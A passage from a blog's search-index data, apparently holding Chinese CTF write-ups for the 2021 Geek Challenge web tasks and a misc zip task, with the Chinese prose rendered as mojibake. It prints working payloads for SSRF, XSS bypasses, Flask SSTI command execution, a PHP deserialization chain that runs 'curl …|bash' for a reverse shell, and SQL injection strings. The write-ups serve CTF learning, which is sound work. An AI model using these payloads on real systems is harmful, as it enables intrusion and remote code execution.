up/","link":"","permalink":"http://example.com/2021/11/15/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982021%E3%80%91write%20up/","excerpt":"å‰è¨€2021çš„æå®¢å¤§æŒ‘æˆ˜ç»“æŸäº†ï¼Œé¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œä¹Ÿç²—ç•¥è®¤è¯†å­¦ä¹ äº†å¾ˆå¤šæ–°ä¸œè¥¿ï¼Œwebåšäº†11é¢˜å‡ºæ¥ï¼Œéƒ½å¤§è‡´å†™ä¸‹æ€è·¯å§ã€‚","text":"å‰è¨€2021çš„æå®¢å¤§æŒ‘æˆ˜ç»“æŸäº†ï¼Œé¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œä¹Ÿç²—ç•¥è®¤è¯†å­¦ä¹ äº†å¾ˆå¤šæ–°ä¸œè¥¿ï¼Œwebåšäº†11é¢˜å‡ºæ¥ï¼Œéƒ½å¤§è‡´å†™ä¸‹æ€è·¯å§ã€‚ Write UpWelcome2021è¿›å…¥ç½‘é¡µåä¸€ä¸²hintï¼Œå¾—çŸ¥è¿™å…³è€ƒå¯Ÿçš„æ˜¯htmlçš„çŸ¥è¯†ï¼Œé‚£æˆ‘ä»¬å…ˆæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°æç¤ºè¦ç”¨WELCOMEè¯·æ±‚æ–¹æ³•æ¥è¯·æ±‚ç½‘é¡µï¼Œé‚£æˆ‘ä»¬æŠ“åŒ…ç„¶åæ”¹å˜è¯·æ±‚æ–¹æ³•ï¼š ä¸‹ä¸€æ­¥æ˜¯å»f1111aaaggg9.phpï¼Œè®°å¾—ä¿æŒWELCOMEè¯·æ±‚æ–¹æ³•ï¼Œè®¿é—®å°±å¯ä»¥äº†ï¼š Darké¢˜ç›®ç»™çš„URLæ˜¯ä¸€ä¸ªonionç»“å°¾çš„é“¾æ¥ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦ä¸€ä¸ªToræµè§ˆå™¨å’Œé­”æ³•ä¸Šç½‘å·¥å…·ï¼Œè¿™äº›ä¸œè¥¿åªèƒ½è‡ªå·±åŠ¨æ‰‹ä¸°è¡£è¶³é£Ÿäº†ï¼Œç”¨æ´‹è‘±æµè§ˆå™¨æ‰“å¼€é“¾æ¥æŸ¥çœ‹æºç è·å¾—flagï¼š babyphpè¿›å…¥ç½‘é¡µæ²¡æœ‰ä»€ä¹ˆæœ‰æ•ˆä¿¡æ¯ï¼ŒæŸ¥çœ‹æºç å‘ç°æç¤ºæˆ‘ä»¬æŸ¥çœ‹robotsï¼Œå‘ç°è—äº†ä¸€ä¸ªnoobcurl.phpï¼Œè¿›å…¥ä¹‹åæ˜¯ä¸€æ®µæºä»£ç ï¼š 1234567891011121314151617&lt;?phpfunction ssrf_me($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); curl_close($ch); echo $output;&#125;if(isset($_GET[&#x27;url&#x27;]))&#123; ssrf_me($_GET[&#x27;url&#x27;]);&#125;else&#123; highlight_file(__FILE__); echo &quot;&lt;!-- æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œflagåœ¨æ ¹ç›®å½• --&gt;&quot;;&#125; ä¸€æ®µcurlä»£ç ï¼Œä¸å‡ºæ„å¤–è¿™å°±æ˜¯é¢˜phpæ–‡ä»¶åŒ…å«é¢˜äº†ï¼Œå†ç»“åˆæç¤ºflagåœ¨æ ¹ç›®å½•ä¸­ï¼Œç›´æ¥æ„å»ºpayloadï¼š 1?url=file:///flag å¾—åˆ°flagï¼š èœœé›ªå†°åŸç”œèœœèœœè¦æ±‚æˆ‘ä»¬ç‚¹å‡ºç¬¬ä¹æ¯é¥®æ–™ï¼Œç„¶è€Œä¸‹é¢èœå•åªæœ‰8æ¯é¥®æ–™ï¼Œf12æŸ¥çœ‹å‘ç°èœå•çš„æ¯ç“¶é¥®æ–™éƒ½å¯¹åº”äº†ä¸€ä¸ªidï¼Œç¬¬ä¸€æ¯å°±æ˜¯1ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠè¿™ä¸ªidæ”¹æˆ9ï¼Œå†ç‚¹å‡»èœå•ä¸Šçš„é‚£æ¯é¥®æ–™å°±å¯ä»¥äº†ï¼š é›·å…‹é›…æœªå…‹è¿›ç½‘é¡µæµè§ˆä¸€éï¼Œå…¶ä»–éƒ½æ˜¯è™šçš„ï¼Œåªæœ‰ä¸­é—´è¿™å‡ è¡Œæ˜¯é‡è¦çš„ï¼š è¿™ä¸€çœ‹å°±æ˜¯ä¼ªé€ xffï¼Œä½†æ˜¯è¿™ä¸ªç»çº¬åº¦æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œç‚¹å‡»ä¸€ä¸‹æ£€æµ‹ä½ç½®æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼š å¥½å˜›ï¼ŒåŸæ¥ç»çº¬åº¦å°±æ˜¯cookieä¸­çš„æ•°æ®ï¼Œé‚£æˆ‘ä»¬ç”¨ç½‘ç«™ç»™çš„ç»çº¬åº¦æŸ¥è¯¢æŸ¥å‡ºç»çº¬åº¦å¹¶ä»£å…¥cookieä¸­ï¼Œå†ä¼ªé€ xffï¼Œå¾—åˆ°ä¸€ä¸²å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼š ä¸€èˆ¬è¿™ç§å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿æ”¾åœ¨æ§åˆ¶å°é‡Œè·‘éƒ½ä¼šæœ‰æƒŠå–œå‡ºç°ï¼š babyxsså…³äºxsså…·ä½“åŸç†ç­‰ç­‰ç­‰ä¹‹ååˆ·DVWAå†å…·ä½“ç»†è¯´ï¼Œè¿™é‡Œå°±ç®€å•è®²ä¸‹è§£æ³•ã€‚ ç¬¬ä¸€ç§è§£æ³•ï¼Œç”±äºæˆ‘ä»¬å‘ç°alertè¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Data URIï¼Œæ’å…¥ä¸€ä¸ªhtmlæ–‡æ¡£æ¥è¿›è¡Œæ³¨å…¥ï¼š 1&lt;/script&gt;&lt;script src=data:text/html,%61%6c%65%72%74(1)&gt; ç¬¬äºŒç§è§£æ³•ï¼Œæœ‰ç‚¹é­”å¹»ï¼Œæˆ‘ä¹Ÿä¸ä¼šè§£é‡Šï¼Œå°±ç›´æ¥ç»™payloadä»¥åŠé“¾æ¥äº†ï¼š 1&quot;+[][(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]][(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+&#123;&#125;[0])[1]+(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[2]+(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]]((&#x27;&#x27;+!1)[1] + (&#x27;&#x27;+!1)[2] + (&#x27;&#x27;+!1)[4] +(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]+&quot;(1)&quot;)())// ä¸Šè¿°payloadåˆ†æ ä¸¤ç§è§£æ³•éƒ½å¯ä»¥å¾—åˆ°flagï¼š babypyä¸€é¢˜flask SSTIæ¼æ´é¢˜ï¼Œåšé¢˜æ—¶ç®€å•å­¦ä¹ äº†ä¸‹ï¼Œå…·ä½“åŸç†å¯ä»¥å‚è€ƒè¿™ç¯‡åšå®¢ï¼šflask SSTIæ¼æ´ ç›´æ¥è®²é¢˜ï¼Œé¦–å…ˆè·å–åŸºæœ¬ç±»ï¼Œè¿™é‡Œç”¨mroè¯•äº†å¥½åƒä¸è¡Œï¼Œå› æ­¤ç”¨baseæ¥è¿›è¡Œæ³¨å…¥ï¼š 1&#123;&#123;&#123;&#125;.__class__.__bases__[0]&#125;&#125; è·å¾—åŸºæœ¬ç±»ååªæœ‰ä¸€ä¸ªobjectï¼Œæ¥ä¸‹æ¥è·å–å…¶å­ç±»ï¼š 1&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()&#125;&#125; å¯ä»¥å‘ç°è¿™ä¸ªå­ç±»æ˜¯ç›¸å½“çš„å¤šå•Šï¼Œï¼Œä½†å…¶å®å…³é”®çš„ä¹Ÿå°±é‚£å‡ ä¸ªï¼Œæœç´¢ä¸€ç•ªå…¶ä¸­æœ‰ä¸€ä¸ªå«warnings.catch_warningsï¼Œé¦–å…ˆæˆ‘ä»¬è¦å®šä½è¿™ä¸ªå­ç±»çš„ä½ç½®ï¼Œè¿™é¢˜ä¸èƒ½ç›´æ¥é€šè¿‡å‘½ä»¤è·å–ï¼Œé‚£æˆ‘ä»¬å°±å¤§è‡´åˆ¤æ–­ç¼©å°èŒƒå›´ï¼Œæœ€åé”å®šä½ç½®æ˜¯208ã€‚æ¥ç€ç›´æ¥æ„å»ºå‘½ä»¤æ‹¿åˆ°flagï¼š 1&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()[208].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125; babyPOPphpååºåˆ—åŒ–çš„é¢˜ç›®ã€‚ä»£ç å®¡è®¡ä¸€éï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?phpclass a &#123; public static $Do_u_like_JiaRan = false; public static $Do_u_like_AFKL = false;&#125;class b &#123; private $i_want_2_listen_2_MaoZhongDu; public function __toString() &#123; if (a::$Do_u_like_AFKL) &#123; return exec($this-&gt;i_want_2_listen_2_MaoZhongDu); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;class c &#123; public function __wakeup() &#123; a::$Do_u_like_JiaRan = true; &#125;&#125;class d &#123; public function __invoke() &#123; a::$Do_u_like_AFKL = true; return &quot;å…³æ³¨å˜‰ç„¶,&quot; . $this-&gt;value; &#125;&#125;class e &#123; public function __destruct() &#123; if (a::$Do_u_like_JiaRan) &#123; ($this-&gt;afkl)(); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;if (isset($_GET[&#x27;data&#x27;])) &#123; unserialize(base64_decode($_GET[&#x27;data&#x27;]));&#125; else &#123; highlight_file(__FILE__);&#125; å…·ä½“åˆ†æï¼šæˆ‘ä»¬å‘ç°èƒ½å¤Ÿè·å–flagæ–‡ä»¶çš„åªæœ‰exec()å‡½æ•°ï¼Œè€Œè¦è§¦å‘åˆ™éœ€è¦a::$Do_u_like_AFKLä¸ºtrueï¼Œåœ¨ç±»dä¸­çš„__invoke()æ–¹æ³•å¯ä»¥åšåˆ°è¿™ç‚¹ã€‚__invoke()ä¼šåœ¨è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œæˆ‘ä»¬åœ¨ç±»eä¸­æ‰¾åˆ°äº†è¿™ä¸€è§¦å‘æ–¹å¼ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨ç±»cä¸­ä½¿å¾—a::$Do_u_like_JiaRanï¼›æ‰€ä»¥åªè¦åœ¨ç±»eä¸­ä½¿$afkl=new d()å³å¯ã€‚è€Œç±»cæ˜¯ä¸€ä¸ª__wakeup()æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬ååºåˆ—åŒ–çš„å¯¹è±¡åº”è¯¥å°±æ˜¯ç±»cã€‚åŒæ—¶ç±»bæ˜¯ä¸€ä¸ª__toString()æ–¹æ³•ï¼Œä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,è¿™ä¸ªæ–¹æ³•åœ¨ç±»dä¸­è¢«å‘ç°ã€‚ è¿™å°±éƒ½å¯¹ä¸Šäº†ï¼Œæ¥ä¸‹æ¥æ„å»ºpayloadã€‚åœ¨ç±»dä¸­å°†$this-&gt;valueèµ‹å€¼ä¸ºç±»bçš„å®ä¾‹åŒ–å¯¹è±¡å³å¯è¾“å‡ºç±»bï¼Œä½†dä¸­æ²¡æœ‰$valueå˜é‡ï¼Œå› æ­¤æˆ‘ä»¬è‡ªå·±åˆ›é€ ä¸€ä¸ªã€‚æ¥ç€è°ƒç”¨dç±»ï¼Œåœ¨ç±»eä¸­ä½¿$afkl=new d()å³å¯ã€‚æœ€åå°†ç±»cå’Œç±»eè¿æ¥ï¼Œåœ¨ç±»cä¸­æ„é€ ä¸€ä¸ªå˜é‡ï¼Œä½¿ä»–çš„å€¼ä¸ºnew e()å³å¯ã€‚ è€Œç”±äºexec()æ— å›æ˜¾ï¼Œå› æ­¤éœ€è¦è¿›è¡Œåå¼¹shellã€‚ æœ€åpayloadï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpclass a &#123; public static $Do_u_like_JiaRan = false; public static $Do_u_like_AFKL = false;&#125;class b &#123; private $i_want_2_listen_2_MaoZhongDu; public function __construct() &#123; $this-&gt;i_want_2_listen_2_MaoZhongDu=&quot;curl http://å…¬ç½‘ip/æ–‡ä»¶|bash&quot;; &#125; public function __toString() &#123; if (a::$Do_u_like_AFKL) &#123; return exec($this-&gt;i_want_2_listen_2_MaoZhongDu); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;class c &#123; public $b; public function __wakeup() &#123; a::$Do_u_like_JiaRan = true; &#125;&#125;class d &#123; public $value; public function __invoke() &#123; a::$Do_u_like_AFKL = true; return &quot;å…³æ³¨å˜‰ç„¶,&quot; . $this-&gt;value; &#125;&#125;class e &#123; public $afkl; public function __destruct() &#123; if (a::$Do_u_like_JiaRan) &#123; ($this-&gt;afkl)(); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;$c=new c();$e=new e();$d=new d();$b=new b();$b-&gt;value=$b;$d-&gt;value=$b;$e-&gt;afkl=$d;$c-&gt;b=$e;echo base64_encode(serialize($c)); å°†è¾“å‡ºç»“æœgetè¿›ç½‘é¡µï¼Œè¿›è¡Œåå¼¹shellï¼Œå¾—åˆ°flagï¼š Baby_PHP_Black_Magic_Enlightenmentè¿›å…¥ç½‘é¡µå…ˆè¿›è¡Œä»£ç å®¡è®¡ï¼šGETè¿›ä¸€ä¸ªpasswordï¼Œè¿™ä¸ªå€¼è¦å¤§äº9999ä½†ä¸èƒ½æ˜¯ä¸ªæ•°å­—ï¼Œè¿™ç§é¢˜åšè¿‡å¾ˆå¤šæ¬¡äº†ï¼Œpassword=10000aå°±å¯ä»¥äº†ã€‚ä½†æ˜¯å‘ç°è™½ç„¶æ˜¾ç¤ºäº†â€Howâ€™s that possibleâ€ï¼Œä½†æ˜¯é¡µé¢å´æ²¡æœ‰å›æ˜¾2.phpçš„å†…å®¹ï¼Œå¯èƒ½æ˜¯è¢«æ³¨é‡Šäº†ï¼Œf12æŸ¥çœ‹å‘ç°ç¡®å®å¦‚æ­¤ï¼š å‰å¾€ä¸‹ä¸€æ­¥ï¼Œåˆæ˜¯ä¸€ä¸²ä»£ç ï¼Œå®¡è®¡ä¸€éå‘ç°æ„æ€æ˜¯GETä¸€ä¸ªuserå’Œä¸€ä¸ªpassï¼Œä¸¤è€…çš„å†…å®¹ä¸èƒ½ä¸€è‡´ä½†æ˜¯sha1åŠ å¯†åçš„å€¼è¦ç›¸ç­‰ï¼Œè¿™é‡Œåˆ©ç”¨sha1å‡½æ•°ä¸md5å‡½æ•°å…±æœ‰çš„æ¼æ´ï¼Œä»¥æ•°ç»„çš„æ–¹å¼è¿›è¡Œæ£€æµ‹ï¼š 1?user[0]=123&amp;pass[1]=123 è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸè¿›å…¥äº†ä¸‹ä¸€å…³baby_revenge.phpï¼Œè¿™æ¬¡ä¹Ÿæ˜¯sha1äº§ç”Ÿçš„hashç¢°æ’ï¼Œä½†æ˜¯æ•°ç»„è¢«è¿‡æ»¤æ‰äº†ï¼Œçœ‹èµ·æ¥è¿™æ¬¡æ˜¯ç¢°åˆ°ç¡¬èŒ¬äº†ã€‚ä½†æ˜¯åœ¨æˆ‘æŸ¥æ‰¾èµ„æ–™çš„æ—¶å€™ï¼Œæ‰¾åˆ°äº†è¿™ä¹ˆä¸€ç¯‡åšå®¢ï¼šå…³äºSHA1ç¢°æ’â€”â€”æ¯”è¾ƒä¸¤ä¸ªbinaryçš„ä¸åŒä¹‹å¤„è¿™ç¯‡åšå®¢çš„å†…å®¹ç›¸å½“çš„å‰å®³ï¼Œé‡Œé¢æåˆ°äº†googleå‡ºä¸¤ä¸ªSHA1å€¼ç›¸åŒè€Œä¸ä¸€æ ·çš„pdfæ–‡ä»¶å¹¶åˆ©ç”¨äº†è¿™ä¸¤ä¸ªæ–‡ä»¶è¿›è¡Œhashç¢°æ’ï¼Œæˆ‘ä»¬ç›´æ¥æ„é€ è¿™ä¸ªpayloadå¾—åˆ°ä¸‹ä¸€ä¸ªæ–‡ä»¶here_s_the_flag.phpï¼š è¿™æ˜¯æœ€åä¸€å…³äº†ï¼Œæˆ‘ä»¬è¦GETä¸€ä¸ªidè¿›å»ï¼Œè¦æ±‚idè¿›è¡Œä¸€æ¬¡urlè§£ç åè¦æ˜¯å­—ç¬¦ä¸²â€Longloneâ€ï¼Œä½†æ˜¯idä¸­ä¸èƒ½æ£€æµ‹åˆ°â€Longloneâ€ã€‚è¿™ä¸€å…³å…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå› ä¸ºç½‘é¡µåœ¨è¯»å–æ—¶ä¼šå…ˆè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œæ¥ç€ä»£ç ä¸­ä¼šå†æ¬¡è¿›è¡Œä¸€æ¬¡ï¼Œå› æ­¤æˆ‘ä»¬å°†è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œä¸¤æ¬¡urlç¼–ç å°±å¯ä»¥äº†ã€‚ babysqlæœ€ç®€å•çš„sqlæ³¨å…¥äº†ï¼ŒPOSTç±»å‹ã€‚ç›´æ¥ç”¨sqlmapè·‘å°±èƒ½å‡ºæ¥äº†ã€‚æ‰‹å·¥æ³¨å…¥æˆ‘æµ‹è¯•å‡ºæ¥äº†è”åˆæ³¨å…¥ï¼Œç›²æ³¨ç­‰ç­‰éƒ½å¯ä»¥ï¼ŒæŠ¥é”™æ³¨å…¥ç”±äºæ— å›æ˜¾å› æ­¤ä¸èƒ½ä½¿ç”¨ã€‚è¿™é‡Œå°±è·‘ä¸ªsqlmapå§ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243python2 sqlmap.py -r 1.txt --dbsavailable databases [6]:[*] babysql[*] flag[*] information_schema[*] mysql[*] performance_schema[*] testpython2 sqlmap.py -r 1.txt -D flag --tablesDatabase: flag[1 table]+-------+| fllag |+-------+python2 sqlmap.py -r 1.txt -D flag -T fllag --columnsDatabase: flagTable: fllag[2 columns]+-----------+--------------+| Column | Type |+-----------+--------------+| fllllllag | varchar(100) || wlz | varchar(100) |+-----------+--------------+python2 sqlmap.py -r 1.txt -D flag -T fllag -C fllllllag --dumpDatabase: flagTable: fllag[1 entry]+------------------------+| fllllllag |+------------------------+| SYC&#123;U_4N0vv_Sql_Noyv~&#125; |+------------------------+ anothersqlè¿™é¢˜å°±å­˜åœ¨ç€ä¸€å®šçš„è¿‡æ»¤äº†ï¼Œè”åˆæŸ¥è¯¢ä¸èƒ½ç”¨ï¼Œupdatexmlå’Œextractvalueä¹Ÿæ˜¯è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯floorï¼Œæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç”¨floorè¿‡æ»¤å°±å¯ä»¥äº†ï¼š 123456789101112131415161718admin&#x27; and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;true____flag1&#x27; for key &#x27;&lt;group_key&gt;&#x27;admin&#x27; and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;true____flag&#x27;),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;syclover1&#x27; for key &#x27;&lt;group_key&gt;&#x27;admin&#x27; and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;true____flag&#x27; and table_name=&#x27;syclover&#x27;),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;id,uname,pwd,flag1&#x27; for key &#x27;&lt;group_key&gt;&#x27;admin&#x27; and (select 1 from (select count(*),concat((select concat(flag) from syclover limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;1&#x27; for key &#x27;&lt;group_key&gt;&#x27; æ€»ç»“è¿™æ¬¡æ¯”èµ›è¿˜æ˜¯è§è¯†äº†å¾ˆå¤šæ–°ç©æ„å„¿çš„ï¼Œä»¥ååˆ·é¶åœºçš„æ—¶å€™å¯ä»¥è¿›è¡Œæ‹“å±•ï¼Œä¹Ÿå·©å›ºäº†å·²æœ‰çš„åªæ˜¯ï¼Œç»§ç»­åŠªåŠ›ã€‚","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf -web","slug":"ctf-web","permalink":"http://example.com/tags/ctf-web/"}]},{"title":"ã€2021æ·±è‚²æ¯ã€‘misc-login write up","slug":"ã€2021æ·±è‚²æ¯ã€‘misc-login-write-up","date":"2021-11-13T11:02:51.000Z","updated":"2021-12-06T11:16:15.677Z","comments":true,"path":"2021/11/13/ã€2021æ·±è‚²æ¯ã€‘misc-login-write-up/","link":"","permalink":"http://example.com/2021/11/13/%E3%80%902021%E6%B7%B1%E8%82%B2%E6%9D%AF%E3%80%91misc-login-write-up/","excerpt":"å‰è¨€åˆ«é—®ä¸ºä»€ä¹ˆä¸€ä¸ªwebæ‰‹å†™äº†ä¸ªmiscçš„é¢˜ï¼Œé—®å°±æ˜¯webæ ¹æœ¬ä¸ä¼šã€‚è¿™æ¬¡æ¯”èµ›è¿ç­¾åˆ°é¢˜å…¨é˜Ÿåšäº†3é¢˜ï¼Œå¹¶åˆ—70-80åé‚£ä¸€å¸¦ã€‚","text":"å‰è¨€åˆ«é—®ä¸ºä»€ä¹ˆä¸€ä¸ªwebæ‰‹å†™äº†ä¸ªmiscçš„é¢˜ï¼Œé—®å°±æ˜¯webæ ¹æœ¬ä¸ä¼šã€‚è¿™æ¬¡æ¯”èµ›è¿ç­¾åˆ°é¢˜å…¨é˜Ÿåšäº†3é¢˜ï¼Œå¹¶åˆ—70-80åé‚£ä¸€å¸¦ã€‚ write upç›´æ¥ä¸Šé¢˜å§ã€‚é¦–å…ˆè¿›å»æ˜¯ä¸ªç½‘é¡µï¼Œè¦æˆ‘ä»¬è¿›è¡Œä¸€ä¸ªé™†çš„ç™»ï¼Œå½“ç„¶æˆ‘ä»¬æ—¢ä¸çŸ¥é“è´¦å·ä¹Ÿä¸çŸ¥é“å¯†ç ï¼Œé‚£æˆ‘ä»¬å°±ç‚¹å‡»è·å–å®ä¾‹è¿›å»ï¼Œå‘ç°è·³è½¬åˆ°ä¸€ä¸ªæ–°çš„ç½‘é¡µï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è·å–æç¤ºæ–‡æ¡£æ¥è·å¾—ä¸€ä¸ªexample.zipã€‚è™½ç„¶ç½‘é¡µæ€‚æ¿æˆ‘ä»¬æŠŠå…¶ä¸­çš„å†…å®¹å‘é€åˆ°ä¸€ä¸ªé‚®ç®±é‡Œï¼Œä½†hintå‘Šè¯‰æˆ‘ä»¬æ­¤ä¹ƒè°è¨€ã€‚ æ‰“å¼€zipå‘ç°æ˜¯åŠ å¯†æ–‡æ¡£ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹å¾ˆå¥‡æ€ªï¼Œå°±æ˜¯zipå†…æœ‰ä¸€ä¸ªç¤ºä¾‹.txtå’Œä¸€ä¸ªè¯¥æ–‡ä»¶çš„å‰¯æœ¬ï¼Œæˆ‘ä»¬åˆç†æ€€ç–‘è¿™é‡Œæœ‰ä¸ªä¼ªåŠ å¯†ï¼Œå› æ­¤æˆ‘ä»¬å¤‡ä»½ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åæ‹¿example.zipæ‰”è¿›ZipCenOpé‡Œè·‘ä¸€ä¸‹ï¼š 1java -jar ZipCenOp.jar r example.zip æœç„¶æˆ‘ä»¬å‘ç°è¿™ä¸ªå‰¯æœ¬æ–‡ä»¶æ˜¯ä¼ªåŠ å¯†ï¼Œè·‘å®ŒZipCenOpåæ‰“å¼€example.zipå°±å¯ä»¥ç›´æ¥å°†å‰¯æœ¬æ–‡ä»¶è§£å‹å‡ºæ¥äº†ã€‚è§£å‹å‡ºæ¥åå°±æ˜¯æ˜æ–‡ç ´è¯‘zipå¯†ç äº†ï¼Œè¿™é‡Œå‹ç¼©å‰¯æœ¬æ–‡ä»¶æ—¶ä¸€å®šè¦ç”¨winrarï¼Œå¦åˆ™æ˜æ–‡ç ´è¯‘ä¼šå¤±è´¥ã€‚ æˆ‘ä»¬ç”¨AZPRæ¥è·‘ï¼šå¯†ç æ˜¯qwe@123 è¿™æ ·password.zipå°±è¢«æˆ‘ä»¬è§£å‹å‡ºæ¥äº†ï¼Œç‚¹å¼€ä¹‹åå‘ç°åˆæ˜¯åŠ å¯†æ–‡æ¡£ï¼Œä¸è¿‡è¿™å›çš„æ–‡æ¡£é‡Œæ˜¯ä¸€ä¸ªswpæ–‡ä»¶å’Œ3ä¸ªå¤§å°ä¸º6çš„txtæ–‡ä»¶ï¼ŒCRC32åˆæ˜¯å·²çŸ¥çš„ï¼ˆåˆ†åˆ«ä¸º0x21137233ï¼›0x4B8F7BE7ï¼›0x1028C889)ï¼Œå¾ˆå®¹æ˜“åˆ¤æ–­å‡ºæ¥æˆ‘ä»¬è¦å¯¹è¿™ä¸‰ä¸ªtxtè¿›è¡ŒCRCç¢°æ’ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨crc32 toolsè¿›è¡Œcrcç¢°æ’ï¼Œå¦‚æœå¤§å°è¶…è¿‡6ä½è¿™ä¸ªè„šæœ¬å°±ä¸èƒ½ç”¨äº†ã€‚ ç¢°æ’ç»“æœï¼š æˆ‘ä»¬è¿™é‡Œåˆ†ææ‹¼æ¥ï¼Œå¾—åˆ°zipçš„å¯†ç åº”è¯¥æ˜¯welc0me_sangforctfï¼Œè§£å‹å‡º.password.swpï¼Œç”¨010Editoræ‰“å¼€æ–‡ä»¶ï¼Œç¿»åˆ°æœ€åï¼Œå‘ç°è¿™ä¹ˆå‡ è¡Œï¼š è¿™å°±æ˜¯æˆ‘ä»¬çš„è´¦å·å’Œå¯†ç äº†ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨è´¦å·å’Œå¯†ç ç™»å½•ï¼Œç½‘é¡µä¹Ÿæç¤ºæˆ‘ä»¬æˆåŠŸæ‰¾åˆ°äº†flagï¼Œå¯æ˜¯æˆ‘ä»¬å‘ç°f12å’Œé¼ æ ‡å³é”®è¢«ç¦ç”¨äº†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ç™»å½•å‰å°±æå‰æ‰“å¼€f12ï¼Œå†è¿›è¡Œç™»é™†ï¼Œç»ˆäºæ‰¾åˆ°äº†flagï¼š æ€»ç»“è¿™æ¬¡æ¯”èµ›æˆ‘æ˜ç™½äº†å‡ ä¸ªé“ç†ï¼š webä¸æ˜¯äººèƒ½åšçš„ å¸¦easyçš„é¢˜ç›®æ˜¯æœ€éš¾çš„ ä¸åŠ¡æ­£ä¸šä¹ŸæŒºå¿«ä¹çš„ï¼ˆbushi ä¸‹å‘¨æå®¢å¤§æŒ‘æˆ˜ç»“æŸå†å†™ä¸€ä»½wpï¼Œè¿™å‘¨åˆ’äº†ã€‚","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf -misc","slug":"ctf-misc","permalink":"http://example.com/tags/ctf-misc/"}]},{"title":"sqlæ— åˆ—åæ³¨å…¥ä¸ä½œä¸šwp","slug":"sqlæ— åˆ—åæ³¨å…¥ä¸ä½œä¸šwp","date":"2021-11-11T09:08:46.000Z","updated":"2021-12-01T08:28:17.197Z","comments":true,"path":"2021/11/11/sqlæ— åˆ—åæ³¨å…¥ä¸ä½œä¸šwp/","link":"","permalink":"http://example.com/2021/11/11/sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%BD%9C%E4%B8%9Awp/","excerpt":"å‰è¨€å®è®­å®¤è®²äº†mysqlçš„è”åˆæŸ¥è¯¢æ³¨å…¥ä¸æ— åˆ—åæ³¨å…¥ï¼Œå› ä¸ºè”åˆæŸ¥è¯¢åšé¶åœºå°±å†™è¿‡äº†ï¼Œè¿™é‡Œå°±ä¸“é—¨è§£ææ— 